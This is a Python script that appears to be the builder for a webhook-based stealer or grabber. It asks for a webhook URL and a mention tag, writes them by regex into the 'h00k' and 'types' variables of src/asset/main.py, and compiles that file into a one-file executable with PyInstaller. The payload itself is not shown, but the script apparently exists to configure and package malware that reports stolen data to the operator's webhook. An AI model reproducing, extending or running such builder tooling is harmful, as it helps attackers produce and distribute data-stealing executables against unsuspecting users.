import subprocess
import colorama
from colorama import Fore
import os
import json
import time
import re
from getpass import getpass
from pystyle import Center

colorama.init(autoreset=True)
os.system("cls" if os.name == "nt" else "clear")

ascii_art = """
    \033[38;2;128;0;128m       .____                               __   
    \033[38;2;153;51;153m       |    |    __ __  ____  ____   _____/  |_ 
    \033[38;2;178;102;178m       |    |   |  |  _/ ____/ __ \\ /    \\   __\\
    \033[38;2;204;153;204m       |    |___|  |  \\  \\__\\  ___/|   |  |  |  
    \033[38;2;229;204;229m       |_______ |____/ \\___  \\___  |___|  |__|  
    \033[38;2;255;255;255m           \\/          \\/    \\/     \\/     
"""

target_file = "src/asset/main.py"

def replace_hook_in_main():
    while True:
        print(Center.XCenter(ascii_art))

        new_hook = input(f"{Fore.LIGHTMAGENTA_EX}? {Fore.RESET}|\033[38;2;204;153;204m Webhook {Fore.RESET}| {Fore.LIGHTMAGENTA_EX}").strip()
        mention = input(f"{Fore.LIGHTMAGENTA_EX}? {Fore.RESET}|\033[38;2;204;153;204m Mention{Fore.RESET} | {Fore.LIGHTMAGENTA_EX}").strip()

        if not new_hook.startswith("https://"):
            print(f"{Fore.YELLOW}[WARN] {Fore.RESET} The webhook entered is not valid. Please try again.")
            input("Press Enter to continue...")
            os.system("cls" if os.name == "nt" else "clear")
            continue
        
        if not mention.startswith("@"):
            print(f"{Fore.YELLOW}[WARN] {Fore.RESET} The mention should start with '@'. Please try again.")
            continue

        try:
            with open(target_file, "r", encoding="utf-8") as f:
                content = f.read()

            content = re.sub(r'h00k\s*=\s*".*?"', f'h00k = "{new_hook}"', content)
            content = re.sub(r'types\s*=\s*".*?"', f'types = "{mention}"', content)

            with open(target_file, "w", encoding="utf-8") as f:
                f.write(content)

            print(f"{Fore.MAGENTA}[INFO] {Fore.RESET} Successfully replaced webhook and mention.")
        
        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR] {Fore.RESET} File '{target_file}' not found.")
            return
        except IOError as e:
            print(f"{Fore.RED}[ERROR] {Fore.RESET} IO error: {e}")
            return

        break

    install_pyinstaller()
    build_exe("pyinstaller")

def install_pyinstaller():
    print(f"{Fore.CYAN}[DEBUG] {Fore.RESET} Requesting PyInstaller installation...")

    try:
        print(f"{Fore.CYAN}[INFO] {Fore.RESET} Installing PyInstaller using pip...")
        subprocess.run([ "pip", "install", "pyinstaller"], check=True, text=True)
        print(f"{Fore.GREEN}[SUCCESS] {Fore.RESET} PyInstaller installed successfully.")

    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[ERROR] {Fore.RESET} Failed to install PyInstaller.")
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] {Fore.RESET} pip not found. Please install pip first.")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {Fore.RESET} An unexpected error occurred during installation: {e}")

def build_exe(method):
    print(f"{Fore.MAGENTA}[INFO] {Fore.RESET} Building {target_file} with {method}...")

    try:
        if method == "pyinstaller":
            subprocess.run(["pyinstaller", "--onefile", target_file], check=True)
        print(f"{Fore.GREEN}[SUCCESS] {Fore.RESET} Executable built successfully.")
    except subprocess.CalledProcessError:
        print(f"{Fore.YELLOW}[WARN] {Fore.RESET} Failed to build with {method}.")
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] {Fore.RESET} {method} not found. Install it via pip.")

if __name__ == "__main__":
    replace_hook_in_main()
